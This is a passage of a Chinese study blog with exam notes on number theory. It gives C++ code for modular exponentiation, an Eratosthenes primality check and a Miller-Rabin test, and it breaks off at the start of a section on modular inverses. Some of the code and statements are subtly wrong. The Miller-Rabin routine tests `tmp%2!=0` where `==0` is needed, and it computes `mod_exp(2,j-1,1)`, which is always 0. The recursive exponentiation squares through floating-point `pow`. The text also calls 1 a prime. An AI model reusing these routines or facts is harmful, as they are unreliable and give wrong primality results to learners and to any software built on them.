class="keyword">if</span>(e%<span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">pow</span>(<span class="built_in">double</span>(<span class="built_in">mod_exp</span>(a,e/<span class="number">2</span>,n)%n),<span class="number">2</span>)%n;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">pow</span>(<span class="built_in">double</span>(<span class="built_in">mod_exp</span>(a,e/<span class="number">2</span>,n)%n),<span class="number">2</span>)%n*(a%n)%n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，用循环编写也是可以的，只需要把指数当作二进制，从低位开始扫描，遇到 0 就不处理，遇到 1 就翻倍，然后每次扫描都通过之前的 n 次方的值，计算 2n 次方的值。二进制数的话，就通过 mod 2 和 /2 去实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">mod_exp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a,<span class="type">unsigned</span> <span class="type">int</span> e, <span class="type">unsigned</span> <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> val= a%n;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> res =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(e!=<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(e%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">res = res*val%n;</span><br><span class="line">&#125;</span><br><span class="line">val = (val%n)*(val%n)%n;</span><br><span class="line">e/=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Eratosthenes-素性检测">Eratosthenes 素性检测</h2><p>通过 Eratosthenes 找出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">{</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mo>⋯</mo><mtext> </mtext><mo separator="true">,</mo><msup><mi>n</mi><mrow><mn>1</mn><mi mathvariant="normal">/</mi><mn>2</mn></mrow></msup><mo fence="true">}</mo></mrow><annotation encoding="application/x-tex">\left\{ 2,3,\cdots ,n^{1/2} \right\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.238em;vertical-align:-0.35em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">{</span></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1/2</span></span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">}</span></span></span></span></span></span> 中的素数，判断 n 是否含有这些素因子。Eratosthenes 筛选法主要是确定 1 和 2 是素数，然后去除 2 的倍数。接着找到下一个数，继续去除这个数的倍数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> is_prime[<span class="number">100000</span>];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Eratosthenes</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a)</span> </span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(is_prime, <span class="number">1</span>, <span class="number">100000</span>*<span class="built_in">sizeof</span>(<span class="type">bool</span>));<span class="comment">//初始都没有被筛除</span></span><br><span class="line"><span class="keyword">if</span>(a==<span class="number">1</span> || a==<span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> sqr = (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sqrt</span>(<span class="built_in">double</span>(a));</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">2</span>;i &lt;= sqr;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_prime[i]) <span class="keyword">continue</span>; <span class="comment">// 如果这个数已经被去除了，就不会用到它</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">2</span>; i*j&lt;=sqr;j++)&#123; <span class="comment">//筛选倍数</span></span><br><span class="line">            <span class="keyword">if</span>(is_prime[i*j]) is_prime[i*j] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果是素数，那么计算整除</span></span><br><span class="line">        <span class="keyword">if</span>(a%i==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Miller-Rabin-素性检测">Miller-Rabin 素性检测</h2><p>任意的素数都可以表示成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>k</mi></msup><mi>q</mi><mo>+</mo><mn>1</mn><mo separator="true">,</mo><mi>k</mi><mo>⩾</mo><mn>0</mn><mo separator="true">,</mo><mi>q</mi><mtext>为奇数</mtext></mrow><annotation encoding="application/x-tex">2^kq+1,k\geqslant 0,q\text{为奇数}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0435em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩾</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord text"><span class="mord cjk_fallback">为奇数</span></span></span></span></span> 的形式，又素数 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> 满足费马小定理定理</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>a</mi><mrow><mi>n</mi><mo>−</mo><mn>1</mn></mrow></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo>=</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mi>k</mi></msup><mi>q</mi></mrow></msup><mtext> </mtext><mtext> </mtext><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo>&lt;</mo><mi>a</mi><mo>&lt;</mo><mi>n</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">a^{n-1}\bmod n=a^{2^kq}\,\,\bmod n=1, 1&lt;a&lt;n-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8641em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0619em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0619em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.927em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8389em;vertical-align:-0.1944em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></span></p><p>然后由因式分解。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0</mn><mo>=</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mi>k</mi></msup><mi>q</mi></mrow></msup><mo>−</mo><mn>1</mn><mo>=</mo><mrow><mo fence="true">(</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup><mi>q</mi></mrow></msup><mo>−</mo><mn>1</mn><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mrow><mi>k</mi><mo>−</mo><mn>1</mn></mrow></msup><mi>q</mi></mrow></msup><mo>+</mo><mn>1</mn><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><msup><mi>a</mi><mi>q</mi></msup><mo>−</mo><mn>1</mn><mo fence="true">)</mo></mrow><munderover><mo>∏</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>k</mi></munderover><mrow><mo fence="true">(</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msup><mi>q</mi></mrow></msup><mo>+</mo><mn>1</mn><mo fence="true">)</mo></mrow><mtext> </mtext><mtext> </mtext><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">0=a^{2^kq}-1=\left( a^{2^{k-1}q}-1 \right) \left( a^{2^{k-1}q}+1 \right) =\left( a^{q}-1 \right)\prod_{j=1}^k{\left( a^{2^{j-1}q}+1 \right)}\,\, \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1452em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0619em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.927em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.8em;vertical-align:-0.65em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0619em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.927em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0619em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.927em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.2499em;vertical-align:-1.4138em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">(</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7144em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;">)</span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∏</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size2">(</span></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.0445em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9021em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size2">)</span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></span></p><p>所以对于给定的 a，如果 n 是素数，那么一定满足一下条件之一：</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>q</mi></msup><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">a^q \bmod n = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∃</mi><mi>j</mi><mo separator="true">,</mo><mn>1</mn><mo>⩽</mo><mi>j</mi><mo>⩽</mo><mi>k</mi><mo separator="true">,</mo><msup><mi>a</mi><mrow><msup><mn>2</mn><mrow><mi>j</mi><mo>−</mo><mn>1</mn></mrow></msup><mi>q</mi></mrow></msup><mo>=</mo><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>−</mo><mn>1</mn><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">\exists j, 1\leqslant j\leqslant k,a^{2^{j-1}q}=\,\,n-1 \bmod n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord">∃</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9945em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9021em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.0556em;"></span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></li></ul><p>所以，<strong>如果都不满足这两个条件，那么 n 必然不是素数。但是如果满足也不一定是素数</strong>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Miller_Rabin</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> n,<span class="type">unsigned</span> a)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tmp = n<span class="number">-1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> k,q;</span><br><span class="line">    k=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(tmp%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">        k++;</span><br><span class="line">        tmp/=<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    q=tmp;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">mod_exp</span>(a,q,n) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=k;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">mod_exp</span>(a,<span class="built_in">mod_exp</span>(<span class="number">2</span>,j<span class="number">-1</span>,<span class="number">1</span>)*q,n)==n<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="乘法逆元">乘法逆元</h2><p>详细过程参考<a href="https://www.blog-blockchain.xyz/college-courses/modular-inverses/">笔记</a>，实际考试的时候大概率记住最好。这也是没办法的事情，考试主要是记忆已有的东西。记住基本递归形式，记住每次回溯的方式。<strong>特别注意溢出的问题，特别是采用 unsigned int 时做减法</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 